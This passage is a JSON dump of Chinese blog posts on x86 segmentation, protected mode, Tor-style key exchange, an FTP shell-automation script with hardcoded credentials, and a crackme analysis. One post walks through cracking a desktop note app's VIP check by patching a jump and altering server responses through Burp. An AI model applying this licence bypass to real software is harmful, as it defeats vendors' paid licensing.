汇编基础这里补充一点汇编基础，如何在确保，给一个拥有6个元素的char型数组赋值时，确保元素所在高位或者低位呢？ 通过观察反汇编可以看出，0x78处在 [ebp-8]的位置上，距离ebp相对较远；0x12处在[ebp-5]的位置上，距离ebp相对较近，两者差了4个字节，我们可以假象在地址空间中的位置如下表： 地址 值 0x12ff40(随便取个值) 0x78 0x12ff41 0x56 0x12ff42 0x34 0x12ff43 0x12 0x12ff44 0x23 0x12ff45 0x00 而Windows操作系统是小端模式，也就是高字节保存在高地址中；例如0x12在0x12345678这个数里属于高字节，0x12所在的地址位0x12ff43相对于0x78位于高地址，所以在赋值时，需要把0x12放到高地址中，根据小端模式在内存中的排列可知，若想确定一个实际值为0x12345678的数，在内存的排列大概是”78563412“这种形势，因此在赋值时按照如下方式： 这里还有一个坑是，赋值时不要加’ ‘，因为一个字节的数不止一个字符，不能放到单引号里。 GDT，LDTGDT和LDT分别指全局描述符表和局部描述符表。由于Windows系统没有使用LDT表，所以可以忽略这个表。而GDT表，表里存储的就是段描述符。 了解GDT表，需要先知道这个表有多大，存在哪里。这时需要借助一个寄存器gdtr，这是个48位的寄存器，其中32位存的是GDT表的位置，16位存的是GDT表的大小；可以通过以下指令进行查询。 由图可知，当前虚拟机中的操作系统，gdt表位于0x8003f000的位置，大小是0x03ff，也就是说从0x8003f000~0x8003f3ff这段内存中，存放着gdt表。 段描述符当执行以下语句时： Code1mov ds, ax CPU会去查表，根据ax的值决定查看GDT表还是LDT表，以及查找表的什么位置，查出哪些数据 首先查看一下GDT表，由于段描述符大小是8字节/64位，所以采用dq指令进行查看。 这里查看了GDT表0x80个字节大小的内存，一个段描述符的大小是8字节，所以显示了16个段描述符。 接下来看一下段描述符表的结构 可以发现，在段描述符中，有着Base，Limit，还有各种Attribute，这些就是从段描述符中查找的数据，并写入段寄存器剩下的80位里。那么有了GDT表和段描述符，那么究竟该选择哪一个段描述符的数据写入段寄存器呢？这就涉及到另一个结构：段选择子 段选择子“段选择子是一个16位的段描述符，该描述符指向了定义该段的段描述符”。 这句话怎么理解，怎么又是16位的段描述符，又是GDT表的段描述符？首先，段的Base，Limit以及Attribute都是由GDT表的段描述符来决定的，那么到底是由哪个段描述符来决定的？为了确定这个段描述符，引入了段选择子这个结构，段选择子，指向了GDT表中某一个段描述符，这样就可以把该段描述符的数据写入到段寄存器内了。所以说，段选择子，是一个段描述符的描述符。下面是段选择子的结构。 由图，结构非常简单，各个位的含义也比较好理解。这里有个小g巧，段选择子一共16位，由于Windows没有使用LDT表，所以TI位永远是0。请求特权级别一般也只有0和3，所以段选择子最后4位的值只有4种组合：0000, 0011, 1000, 1011 加载段描述符至段寄存器除了MOV指令，我们还可以使用LES、LSS、LDS、LFS、LGS指令修改寄存器。 CS不能通过上述的指令进行修改，CS为代码段，CS的改变会导致EIP的改变，要改CS，必须要保证CS与EIP一起改，以后的文章会说到。 Code1les ecx,fword ptr ds:[buffer] //取buffer高2个字节给es，低4个字节给ecx 这里的buffer是一个地址，存了6个字节的数，例如定义buffer为一个6个元素的char型数组。这里的fword指的是三字，也就是6个字节 注意：在数值上需要要求RPL","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"浅谈对称加密传输","slug":"浅谈对称加密传输","date":"2020-03-07T09:19:26.000Z","updated":"2020-06-03T14:28:07.164Z","comments":true,"path":"2020/03/07/浅谈对称加密传输/","link":"","permalink":"http://cata1oc.github.io/2020/03/07/%E6%B5%85%E8%B0%88%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E4%BC%A0%E8%BE%93/","excerpt":"","text":"看到crownless一篇关于Tor原理解析的文章，涉及到了加密传输的部分，以前没仔细理解，现在用通俗的语言记录下来。 基础概要对称加密所谓对称加密，就是通信双方，在发送和接收数据时，使用同一个密钥key对数据进行加密与解密。发送方和接收方必须在数据传送前商定好秘钥。 优点：加密速度快、效率高。 缺点：一旦密钥泄露，加密信息不再安全 25519曲线Curve25519椭圆曲线，是基于蒙哥马利曲线的密钥协商算法，具体如下 蒙哥马利曲线算法，可以做到”Time-constant”，也就是说不论他们进行运算的数值是多少，他们所花的时间是相同的，可以规避“ 时间旁路 ”攻击。（crownless文中有提到这是一种很神奇的可以在不安全的信道上建立共享的对称密钥的方法） 传输过程密钥获取Bob为了访问Alice，先访问Tor的目录服务器，获取一部分Tor节点的IP地址，并从中随机选择三个节点的IP地址A、B、C。然后，Bob会先和A节点通过Curve25519椭圆曲线算法以及协商所需的参数，协商一个对称密钥keyA；这时A节点会将Bob协商密钥所需参数发送给Bob。Bob通过算法计算出对称密钥keyA。之后，Bob和节点A之间就会用这把对称密钥keyA进行加密通信。 然后，Bob把B的IP地址和与B协商密钥所需的参数用对称密钥keyA加密后发送给A。A用keyA解密后，将Bob与B协商密钥所需的参数发送到B的IP地址。B收到参数后产生了对称密钥keyB，并将与Bob协商密钥所需的参数发还给A。A将参数通过keyA加密后发还给Bob。Bob用keyA解密后通过算法计算出对称密钥keyB。Bob通过相同的方法和C协商出keyC。至此，Bob有了三把钥匙keyA、keyB、keyC。 需要注意的是，当把协商密钥所需的参数，发给相应的节点时，若一方还没收到协商的参数并生成密钥，另一方就不会对协商参数进行加密。在B收到参数生成密钥keyB后，将与Bob协商密钥所需的参数发还给A，此时不会对协商参数用keyB进行加密，以保证另一方可以拿到参数生成密钥。但已经进行加密通信的双方，则会使用密钥加密通信数据。 加密传输Bob往Alice发送数据包时，先将数据Data用keyC加密，再用keyB加密，再用keyA加密，就好像层层包裹一样，然后发往节点A。节点A解开一层加密，发往节点B。节点B解开一层加密，发往节点C。节点C解开一层加密，得到Bob发往Alice的明文，发送给Alice。 参考文章： https://bbs.pediy.com/thread-248850.htm https://www.jianshu.com/p/5dba044f67b1","categories":[],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://cata1oc.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"探究段寄存器","slug":"探究段寄存器","date":"2020-03-06T15:00:07.000Z","updated":"2020-03-08T10:35:10.662Z","comments":true,"path":"2020/03/06/探究段寄存器/","link":"","permalink":"http://cata1oc.github.io/2020/03/06/%E6%8E%A2%E7%A9%B6%E6%AE%B5%E5%AF%84%E5%AD%98%E5%99%A8/","excerpt":"被忽视的ds1mov dword ptr ds:[0x003f048], eax 在进行ring3逆向时，海哥让我们不去管ds寄存器的作用，只需要理解，这条语句的作用是将eax的值，写入0x003f048这个地址处即可；但是到了保护模式，这种说法就不再准确了，接下来一步步探寻ds的本质 段寄存器ds 是 CPU 中的一个寄存器，这种寄存器称为段寄存器，除了ds，还有cs、es、ss、fs、gs 、ldtr、tr共八个。 打开OllyDbg，任意附加一个.exe文件，可以在右侧窗口看到如下一块区域","text":"被忽视的dsCode1mov dword ptr ds:[0x003f048], eax 在进行ring3逆向时，海哥让我们不去管ds寄存器的作用，只需要理解，这条语句的作用是将eax的值，写入0x003f048这个地址处即可；但是到了保护模式，这种说法就不再准确了，接下来一步步探寻ds的本质 段寄存器ds 是 CPU 中的一个寄存器，这种寄存器称为段寄存器，除了ds，还有cs、es、ss、fs、gs 、ldtr、tr共八个。 打开OllyDbg，任意附加一个.exe文件，可以在右侧窗口看到如下一块区域 这些是OllyDbg调试器显示出当前程序运行时段寄存器的各部分属性的值。接下来分析这些值的来源和含义。 段寄存器的读写在后面的部分会经常用到段寄存器的读写，这里先说明一下： 读： Code1mov ax, fs 写： Code1mov ds, ax 段寄存器在读的时候，只读了16位，但是写的时候会写入96位。 注意：ldtr和tr段寄存器不能用mov指令进行读写 段寄存器结构Code123456struct SegmentReg { WORD selector; WORD attribute; DWORD base; DWORD limit;} 由段寄存器的结构可知，段寄存器共96位，由16位的段选择子，16位的段属性，32位的base和32位的limit组成。 打印ds寄存器的值，发现只能显示0x0023，也就是段选择子那16位。不是说好的共96位吗？实际上，剩下来80位是不可见的部分，只不过OD也展示出来了，接下来证明每个属性的存在。 段基址Code1mov eax, dword ptr ds:[0] 理论上，上面这条语句是无法执行成功的，因为零地址是不允许访问的（因为没有给零地址挂物理页） 但是上述程序可以成功执行（这里不使用ds，原因是vc6作者对ds做过优化，写成ds将编译不过去），说明了这里访问的不是零地址，而是其它地址，也就是说，段寄存器修改了写入数据的地址，证明了段基址的存在。 这里真正的将数据写入eax的地址是： Code1gs.base + 0x0 以下是常见段的基址 段寄存器 Base ES 0 CS 0 SS 0 DS 0 FS 0x7FFDE000 GS - 由于将fs段的值赋给了gs段，因此写入eax寄存器的是0x7FFDE000地址上的值。 段属性 上面两段程序的差别仅仅在于插入的汇编的第一条指令，mov ax, cs 和 mov ax, ss。造成结果不同的原因是，ss段寄存器是可读、可写的，而cs段寄存器是可读、可执行，但是不可写；因此在试图向cs段寄存器所指向的基址+偏移（既[ ]内的值）是会发生访问违例的，这也说明了，不同的段寄存器，属性是不同的，证明了段属性的存在。 段限长 又出现了访问违例的情况，此处var的值为0x1000，超过了fs段寄存器的Limit：0xFFF，所以此时已经不能通过fs段来访问fs.base+0x1000这个地址了，这说明段寄存器也有一定的管辖范围，超出这个范围，就没有权限访问了 总结这次的笔记主要探究了段寄存器的属性和结构，大致整理如下 段寄存器 段选择子 属性 基址 限长 ES 0x0023 RW 0 0xFFFFFFFF CS 0x001B RX 0 0xFFFFFFFF SS 0x0023 RW 0 0xFFFFFFFF DS 0x0023 RW 0 0xFFFFFFFF FS 0x003B RW 0x7FFDE000 0xFFF GS - - - - 参考文章：https://blog.csdn.net/q1007729991/article/details/52537943 参考教程：https://www.bilibili.com/video/av68700135?p=7","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"初见保护模式","slug":"初见保护模式","date":"2020-03-05T09:19:09.000Z","updated":"2020-03-09T13:58:29.632Z","comments":true,"path":"2020/03/05/初见保护模式/","link":"","permalink":"http://cata1oc.github.io/2020/03/05/%E5%88%9D%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/","excerpt":"保护模式从80386开始，CPU有三种工作方式：实模式，保护模式和虚拟8086模式。在计算机刚启动时CPU处于实模式，然后通过切换机制再进入保护模式，所以现在的操作系统，都是运行在保护模式上。 为何要引入保护模式？在80286以前，CPU只有实模式，在这个模式下，所有的段都是可读，可写，可执行的；此时，系统程序和用户程序可以相互访问彼此的地址，用户稍有不慎就可能修改到系统程序段，影响系统程序的正常运行，导致系统崩溃。","text":"保护模式从80386开始，CPU有三种工作方式：实模式，保护模式和虚拟8086模式。在计算机刚启动时CPU处于实模式，然后通过切换机制再进入保护模式，所以现在的操作系统，都是运行在保护模式上。 为何要引入保护模式？在80286以前，CPU只有实模式，在这个模式下，所有的段都是可读，可写，可执行的；此时，系统程序和用户程序可以相互访问彼此的地址，用户稍有不慎就可能修改到系统程序段，影响系统程序的正常运行，导致系统崩溃。 保护模式的引入提供了段间的保护机制，防止程序间胡乱访问地址带来的问题，同时也扩大了访问的内存空间（没整明白8086实模式的寻址方式，看结果，保护模式的确扩大了寻址空间）。 段、页机制段，页机制均是CPU所提供的，操作系统利用CPU提供的段，页机制，实现对虚拟地址空间的管理，使得操作系统在保护模式上有序，”安全”的工作。","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"从代码中学习shell(一)","slug":"从代码中学习shell01","date":"2019-04-22T02:24:01.000Z","updated":"2022-05-22T17:08:11.356Z","comments":true,"path":"2019/04/22/从代码中学习shell01/","link":"","permalink":"http://cata1oc.github.io/2019/04/22/%E4%BB%8E%E4%BB%A3%E7%A0%81%E4%B8%AD%E5%AD%A6%E4%B9%A0shell01/","excerpt":"","text":"前言4月底的时候，写了一些shell脚本，实现了某个项目功能的自动化，虽然shell基本算是过时了，但在一些场景，它可能比Python用起来更方便。由于对shell不算很熟悉，因此在编写脚本时查询了些许资料。 现在，想将这些知识点总结下来，我选择的方式是从代码中学习，虽然读别人的代码会比较头疼，但这代码是自己写过一遍，更熟悉一些。其次读代码的方式，相比直接看定义，更偏向实践，尽管找想要的功能可能不方便，但是只需稍作修改，就可以拿去直接用了。 需求分析 从服务器下载压缩包文件 将压缩包文件解压，拿到json文件 将json文件分离成不同部分，并调用python脚本完成对数据库的查询 将查询的结果及对应的分离后的json文件回传至服务器 每天下午2点自动完成上述操作 代码分析下载文件shell12345678910111213141516171819202122232425262728293031323334353637383940414243#!/usr/bin/sh# 1.首先是shell中定义函数的方式，直接用函数名就可以调用，不必加上括号# function xxx() {# ...# }# xxxfunction download_file() { # 2.定义函数中要用到的局部变量，定义时等号两边不能有空格 ftp_user=\"pokemon\" ftp_pass=\"pokemon@123456\" ftp_host=\"ftp://65.34.87.12\" subdir=\"Type/\" # 3.执行`date -I`指令可以获得日期，形式为2022-05-20 # 通过${date//'-'/}可以替换掉日期中的符号'-'，得到字符串20220520，此部分可以参考文末链接 # 接下来定义一个数组，数组元素用空格分隔开 date=`date -I` date_pat=${date//'-'/} file_pat_array=(\"Grass\" \"Fire\" \"Water\") # 4.用curl指令，获取ftp服务器指定目录下的文件内容 # -l参数，列出目录下的内容 # -s参数，静默模式，不显示传输过程和错误信息 # -u参数，指定用户:密码 files=$(curl -l -s -u ${ftp_user}:${ftp_pass} ${ftp_host}/${subdir}) # 5.遍历目录下的所有文件，和数组中定义的文件开头与当天日期进行字符串匹配， # 若发现文件名有形如\"Grass???20220520???\"格式的，就将其下载。 # 这里if语句比较，需要用连续两个中括号；遍历数组则用${arr[*]}的形式 for f in ${files[*]};do for file_pat in ${file_pat_array[*]};do if [[ $f == $file_pat*$date_pat* ]] then echo \"start download $f ...\" info=$(curl -O -u ${ftp_user}:${ftp_pass} ${ftp_host}/${subdir}/${f}) echo \"finish download $f\" fi done done} 解压与解密shell1234567891011121314151617181920212223242526272829303132333435363738# Decrypt And Extract Zip Datafunction decrypt_gzip() { dat=\".dat\" json_pattern=\".json\" dir=\"/\" # 1.解压压缩包文件，$1指定了传入的第一个参数，例如`./test arg1` # 这里在循环中匹配了目录文件，.dat文件和.json文件，这么写是因 # 为刚好这个压缩包只有这三种类型文件 for line in `tar -xvzf $1`;do if [[ $line == *$json_pattern ]] then json_file=$line elif [[ $line == *$dat ]] then dat_file=$line elif [[ $line == *$dir ]] then dir=$line fi done # 2.这里使用jq命令处理json文件，安装与使用放在文末 # 然后截取字符串，去掉第一个和最后一个字符 str=$(jq '.sign' $json_file) sign=${str:1:-1} # 3.这部分是通过外部给定的解法，先解出key，再用key解开.dat包得到压缩文件 # 这里解.dat包，参数的含义需要通过man enc查看 key=$(./license-sdk-go.license-sdk-go -p AAAAA-BBBBB-CCCCC-11111-22222.lic -d $sign) openssl enc -aes-256-cbc -d -K $key -iv 0 -in $dat_file -out out.tar.gz # 4.最后解压解密后的压缩包，删除不必要的文件 tar -xvzf out.tar.gz rm out.tar.gz rm -r $dir} 文件过滤shell12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152# Classify Different Data Into Jsonfunction classify_data() { water_pat=\"Water_all\" fire_pat=\"Fire_all\" grass_pat=\"Grass_all\" date=`date -I` date_pat=${date//'-'/} # 这部分主要逻辑都在这，过滤信息： # 1.\"*.gz\"的操作用来遍历当前目录下的所有.gz文件 # 2.根据预先定义的pattern，过滤出对应的.gz文件 # 3.调用前面的函数decrypt_gzip进行解密与解压 # 4.将解压后目录中的.json文件移至当前目录，其余删除 # 5.通过grep提取包含特定字段的行，附加到/重定向到指定.json文件中 # 6.这里补充一个指令，wc可以用来查看文件的字节/字/行的数量 # 7.将提取出的.json文件的内容作为参数，调用其它目录下的python脚本结果保存到新的.json文件中 for f in *.gz;do if [[ $f == $water_pat* ]] then echo $f decrypt_gzip $f mv package/all/water_info.json `pwd` rm -rf package/ grep '\"type\": \"SINGLE\"' water_info.json >> single_plaintext${date_pat}.json grep '\"type\": \"DOUBLE\"' water_info.json > double_crypttext.json rm -f pokemon_info.json python3 ../query_match/match_info_map.py ./double_crypttext.json double_plaintext${date_pat}.json rm -f double_crypttext.json rm -f $f elif [[ $f == $fire_pat* ]] then echo $f decrypt_gzip $f mv package/all/fire_info.json `pwd` rm -rf package/ grep '\"type\": \"SINGLE\"' fire_info.json >> single_plaintext${date_pat}.json rm -f fire_info.json rm -f $f elif [[ $f == $grass_pat* ]] then echo $f decrypt_gzip $f mv package/all/grass_info.json `pwd`/grass_info${date_pat}.json rm -rf package/ python3 ../query_match/match_info_map.py ./grass_info${date_pat}.json grass_info_hash_map${date_pat}.json rm -f $f fi done} 文件上传shell123456789101112131415161718192021222324252627282930# Upload Parsed Datafunction upload_data() { classify_data ftp_user=\"pokemon\" ftp_pass=\"pokemon@123456\" ftp_host=\"ftp://65.34.87.12\" subdir=\"Result/\" date=`date -I` date_pat=${date//'-'/} # 1.这里通过md5sum计算MD5值，获取到对应文件的哈希值 md5sum single_plaintext${date_pat}.json >> pokemon_md5check${date_pat} md5sum double_plaintext${date_pat}.json >> pokemon_md5check${date_pat} md5sum grass_info${date_pat}.json >> pokemon_md5check${date_pat} md5sum grass_info_hash_map${date_pat}.json >> pokemon_md5check${date_pat} # 2.将生成后的数据文件，上传服务器，并清除掉本地文件 # 3.这里上传文件需要指定参数-T，大括号内的所有文件用逗号隔开，不能有空格也不能换行！ curl -u ${ftp_user}:${ftp_pass} ${ftp_host}/${subdir}/ -T \\ \"{single_plaintext${date_pat}.json,double_plaintext${date_pat}.json,grass_info${date_pat}.json,grass_info_hash_map${date_pat}.json,pokemon_md5check${date_pat}}\" rm -rf *${date_pat}.json}# 3.最后进行函数调用，这里upload_data会调用classify_data，# classify_data内部又会调用decrypt_gzip。但是没有函数# 调用download_file，所以需要手动调用download_fileupload_data 定时任务shell1234567# 最后手动设置一个定时任务# crontab -e设定时程表，-r删除目前的时程表，-l列出目前的时程表# f1 f2 f3 f4 f5 program# 分钟(0-59) 小时(0-23) 一个月中的第几天(1-31) 月份(1-12) 星期几(0-6) 执行的程序# 这里设定程序，会先切到对应的目录，否则直接用绝对路径执行，内部调用其它脚本时参数可能会出错crontab -e0 14 * * * cd /home/pokemon_mission && ./download_decrypt_classify_upload.sh 参考链接 C编程：Shell函数详解（函数定义、函数调用） C编程：Shell函数参数 CSDN：Linux Shell 字符串替换 博客园：CentOS7安装jq 简书：jq简易教程 wangchujiang博客：jq Just Code：jq解析 json 实例 CSDN：Shell 数组遍历的3种方法 CSDN：curl 命令的使用：HTTP请求、下载文件、FTP上传下载","categories":[],"tags":[{"name":"Shell","slug":"Shell","permalink":"http://cata1oc.github.io/tags/Shell/"}]},{"title":"某桌面便签软件暴破","slug":"某桌面便签软件暴破","date":"2019-04-11T07:23:53.000Z","updated":"2022-05-19T16:09:05.734Z","comments":true,"path":"2019/04/11/某桌面便签软件暴破/","link":"","permalink":"http://cata1oc.github.io/2019/04/11/%E6%9F%90%E6%A1%8C%E9%9D%A2%E4%BE%BF%E7%AD%BE%E8%BD%AF%E4%BB%B6%E6%9A%B4%E7%A0%B4/","excerpt":"","text":"基础破解 首先发现，VIP功能需要登录。由于内网无法联网，所以先在外网做这个实验 随意输入一个账号并登录，提示账号不存在 进入OD搜索中文字符串，其当前被引用地址为0x79525C 在IDA中根据OD中载入的基址进行Rebase，定位到该地址，从而确定该函数 确定函数后，观察函数的逻辑。发现进入else分支后会去根据回传数据的验证码，判断出错的问题。所以这里不能进入else语句 找到if语句判断的位置 在OD中定位此处，单步过来，发现jnz。这里[esi+0x64]处的值为0，因此不会跳转。此时会继续往下继续判断[esi+0x34]处的值与0x3EC（1004）。所以下面就是判断出错类型的地方，因此这个位置必须要跳转，直接将框住的地方改成je即可，然后继续执行 然后就成功登录了 这里虽然显示账号过期，但是VIP功能可以正常使用（同步除外） 验证可以使用VIP功能，非VIP无法进入下图所示界面 VIP功能如下，框住功能可以正常使用，同步功能需要打掉服务器，有风险 修改完jnz -> je后，右键选择Copy to executable -> All modifications，然后选择Copy All 进入这样一个界面，右键 -> Backup -> Save backup to file，替换掉用来的文件就行 抓包思路 由于burp只能抓设置了代理的应用，这个便签无法设置代理，key建议我使用proxifier进行全局代理。先在Profile -> Proxy Servers 中设置代理服务器地址为 BurpSuite 监听的地址。然后简单配置一下，拦截便签应用发送的数据包到代理，就可以用Burp进行操作 退出先前登录的账号，先随便登录一下。抓个包。可以看到回传包里面有一个 activated字段，目前它是空的。第一个字段code说明了，返回将导致输出结果“账号不存在”。如果对返回包进行适当的修改，也可以实现激活 注意到，后面有提示，注册后赠送40天VIP权限。这里就随便注册一个账号。看一下它的返回包。可以看到activated字段设置为了1。data和expires_data字段也都有值，这两个值表示从1970-01-01至今经过了多少秒。这里，只需要将expires_date的值进行修改。将1653104261修改为3653104261，延长一下激活时间，再来看看情况如何。 它会回传一些数据，我们不用管，进入账号管理可以看到，激活时间为永久","categories":[],"tags":[{"name":"Windows逆向","slug":"Windows逆向","permalink":"http://cata1oc.github.io/tags/Windows%E9%80%86%E5%90%91/"}]},{"title":"记一次恶意样本行为分析","slug":"记一次恶意样本行为分析","date":"2019-03-27T06:54:48.000Z","updated":"2022-05-19T16:10:41.840Z","comments":true,"path":"2019/03/27/记一次恶意样本行为分析/","link":"","permalink":"http://cata1oc.github.io/2019/03/27/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E8%A1%8C%E4%B8%BA%E5%88%86%E6%9E%90/","excerpt":"","text":"分析环境 操作系统：Win10 20H2 分析工具：IDA 7.7 注意事项实际分析时函数名以及变量可能与我的不同，由于IDA对未导出的函数是通过偏移地址进行命名，故可以通过Rebase的方式来实现函数名同步，方法如下所示： Edit -> Segments -> Rebase program Value设置为0，这样就可以使得未导出的函数名一致了，但是变量名仍然不同，需要根据实际情况进行判断 分析过程main部分 首先搜索并进入main函数，F5进入伪代码，发现下方有一个死循环，无用；因此只关心上方的sub_3C294 进入sub_3C294，这部分按照不同颜色的方框归类进行分析 红色方框：读取running_pass这个文件的前25个字节，存储到未初始化的全局变量s1中 橙色方框： 首先初始化一个指针数组，这个指针数组包含7个指针，每个指针指向一块大小为25字节的内存空间；指针数组的首地址为0x268100，由于encrypt程序是64位的ELF，因此每个指针都是8字节 接着，将这7个指针指向的缓冲区，分别用从地址0x1B5037开始（如下图所示）的大小为25字节的字符串进行填充，通过Hex View可以查看这些字符串 蓝色方框：进入sub_3BD75，这个函数会传入一个参数，通过该参数选择上述7个指针中的某一个，取出其中的字符串，用0x262014地址处的值与字符串中的每个字符进行异或运算。此时地址0x262014保存的值为0x21（这个值后期会被修改）。取出的是第一个指针指向的字符串内容，经过异或运算后可得到新的字符串 “Welcome, FLAG is readable”。为了方便分析，我们可以通过快捷键”N”，将sub_3BD75重命名为initStringViaXor 紫色方框：在程序一开始，就调用了signal函数，将信号5的处理函数设置为了handler，进入handler我们可以看到，这个处理函数就是sub_3BFAA；所以后文处的raise(5)其实就是调用sub_3BFAA，当然这里IDA也帮助分析了出来。至此sub_3C294的主体流程分析完，接下来进入sub_3BFAA继续分析 进入sub_3BFAA，这部分的逻辑从伪代码看比较乱，因此在分析时需要结合汇编追踪关注的变量是如何变化的。由于伪代码较长，这里分为两部分看，首先是第一部分，包含4个单独的循环，每个循环进行5轮。当然这部分整个都在一个大的while循环内，这个大循环也是进行5轮 首先是调用了__readfsqword(0x28)，这是一个栈保护过程中获取canary的部分，其本身并不用关心，由于这个值保存在返回地址上面用于防止栈溢出（rbp-4的位置，不过汇编中通过rsp来进行寻址），因此刚好也就在该函数局部变量的后面（局部变量通常位于rbp-8开始，汇编中通常使用rsp来寻址）。因此这里IDA分析的时候使用了v22[5]来保存它，也是因为后期v22[0]~v22[4]会暂存5个字符的指针，它们作为局部变量存储在栈中，刚好在canary的前面 接着调用了initStringViaXor，也就是经过重命名的sub_3BD75，经过异或运算后生成一个字符串。注意这里传入的参数为v21，该变量在第一轮大循环时，v21被赋值为1，因此得到的字符串的值为“RV&Dr_ke1OvS8}ds{9*lg%tE3”，并且将这个字符串，赋值给v2 接下来有一个操作，初始化了一个byte数组，这个数组从0x2680A8开始一直到0x2680AC，共5个字节。用来初始化这些数组的值为地址0x2680BB+0x5（即0x2680C0）开始的连续5个字节的值。但是进入后发现，0x2680C0位于.bss段，并且发现刚好是字符串s1的地址开始处，根据前面的分析，我们知道字符串s1存储的是running_pass文件的前25个字节。所以这一步，就是将这25个字节的前5个字节，赋给数组0x2680A8开始的5个字节地址空间中 接下来进入一个循环，依次从0x2680A8开始，也就是上面被初始化的这个数组中取一个字符，赋值给v5，然后在字符串”RV&Dr_ke1OvS8}ds{9*lg%tE3”中找到字符v5第一次出现的位置，并将这个位置记录在数组v22中（v22是一个char类型的指针数组，指针指向字符串中字符的位置）；若未找到，则保存一个指向截断符00的指针，这个指针位于字符串+0x25偏移处 接下来是第二个循环，这个循环非常关键。这次将v22数组中存的值（字符的位置），依次减去字符串的首地址，得到一个偏移量，这个偏移量就是字符在字符串中的偏移量。然后根据这个偏移量调用不同的函数，调用的函数通过0x260280加上一个偏移获得 进入前两个函数查看其伪代码 如上图所示，0x268100正是指针数组的首地址，a1指定了指针指向的字符串，这里是第一个字符串，其值为”RV&Dr_ke1OvS8}ds{9*lg%tE3”，将这个一维数组看成一个5x5的矩阵，那么这两个函数的作用如下： 可以看到，前两个函数，根据传入的下标，将除下标外，其对应位置所在的横行、竖行、对角线的其他元素全部清零。由此可以发现，这是五皇后算法中的一步（具体可以参考八皇后，本题降低难度选用了五皇后算法，只有10种可能的解），因此可以知道，这个循环，就是根据筛选出的下标，对其他横行、竖行、对角线的值进行清空的操作。 第三个循环用于将根据char类型指针数组v22中保存的指针，将对应的字符存到数组0x2680A8里；这里和先前将s1字符串中的字符保存到数组中不同的是，如果这些字符不在字符串”RV&Dr_ke1OvS8}ds{9*lg%tE3”中， 那么存到数组0x2680A8中的值为0 接下来继续细看第四个循环，这里我把前后对变量的处理也截图进来了，因为它们都很关键。这个循环，将数组0x2680A8中保存的字符对应的ascii值依次进行异或运算，得到一个值保存到变量v16中。然后将v16与3进行与运算，得到一个0~3范围的值，再将这个值与地址0x262014处保存的值（在第一轮大循环时，这个值为0x21）进行异或运算，结果保存在地址0x262014 接下来进入switch语句，循环开始前，有几个赋值语句，对应了函数开头几个未知的赋值语句，这个其实就是push和pop的对应，用于变量的存储与恢复，没有意义，不用关心。 然后我们具体来看switch语句，这里伪代码不清晰，咱们直接看汇编。从汇编中可以看到，switch用于条件判断的值受到寄存器r12影响，r12寄存器的值仅在函数开头被寄存器rdi赋值，整个函数流程中没有再发生变化，再往上跟，可以发现rdi的值，在程序开头被设置为了1！这个rdi，也就是伪代码中定义的变量v21。 因此，我们可以把这里的v23改成v21，很明显，IDA分析错了！实际上这里的switch语句，就是让v21的值在每轮循环递增，所以我们直接看case5的情况。 首先要判断dword_262014与dword_262010的值是否相等，这里实际上是判断是否满足五皇后达成的条件，因为前面会根据每个字符的值进行异或，并最终修改全局变量dword_262014的值（初始为0x21）。如果所有字符串达成了五皇后条件以后，走到这一步的时候，dword_262014的值会被修改回0x21，dword_262010只是做了一个备份，用于后期判断 接下来的判断很关键，会判断字符串s1的前7个字节，与字符串”Red{EV3”是否相同，如果相同，则会修改位于地址0x263CC4的全局变量的值，这个全局变量影响后面的加密算法的选择，这里也是main部分中唯一对解密过程产生影响的地方。至于为什么是用s1进行比较，而不是用数组0x2680A8的值进行比较。是因为数组0x2680A8中只暂存5个字符。它是在对s1字符串进行一次次筛选重排中的一个步骤。 接下来我们来看字符串中的前5个字符”Red{E”，它们在字符串”RV&Dr_ke1OvS8}ds{9*lg%tE3”中的下标分别为[0，7，14，16，23]，换算在5X5矩阵中如下： 此时，打住，在前面第4个循环的时候，做了这样一件事，就是将5个字符进行异或，然后和3进行与运算，再去异或dword_262014的值。我们做这个5个字符做如下操作，得到0x20。也就是说，此时dword_262014的值被修改为0x20 这个时候，我们把新的dword_262014的值代入到下一轮大循环，此时v21的值已经变为2 接下来，我们0x268100这个指针数组中第二指针指向的字符串，再进行一次运算，得到了新的字符串为”JV5NPGzj34rX#L!tbyD-W*}p_” 这个时候我们回到switch语句这里，因为它总共会进行5轮大循环，由于每轮循环v21的值会增加，因此每轮循环选择的字符串也有所不同。因此我们刚刚计算出的字符串”JV5NPGzj34rX#L!tbyD-W*}p_”用于计算s1字符串中第5~9个字符的值。 目前，已经显示了两个字符，也就是“V”，”3”，这俩字符在字符串”JV5NPGzj34rX#L!tbyD-W*}p_”中的下标分别为1和8。我们在5X5矩阵的图中先标记出来。 字符串”JV5NPGzj34rX#L!tbyD-W*}p_” 于是我们自己编写一个五皇后的代码，算出所有的可能性，代码如下： python12345678910111213141516171819202122232425262728293031323334353637383940414243class NQueens: def __init__(self, size): self.size = size self.solutions = 0 self.solve() def solve(self): positions = [-1] * self.size self.put_queen(positions, 0) print(\"Found\", self.solutions, \"solutions.\") def put_queen(self, positions, target_row): if target_row == self.size: self.show_full_board(positions) self.solutions += 1 else: for column in range(self.size): if self.check_place(positions, target_row, column): positions[target_row] = column self.put_queen(positions, target_row + 1) def check_place(self, positions, ocuppied_rows, column): for i in range(ocuppied_rows): if positions[i] == column or positions[i] - i == column - ocuppied_rows or positions[i] + i == column + ocuppied_rows: return False return True def show_full_board(self, positions): for row in range(self.size): line = \"\" for column in range(self.size): if positions[row] == column: line += \"X \" else: line += \"0 \" print(line) print(\"\\n\")def main(): NQueens(5)if __name__ == \"__main__\": main() 列出所有的可能性后，刚好找到一个可以匹配当前情况的五皇后状态，如下图所示： 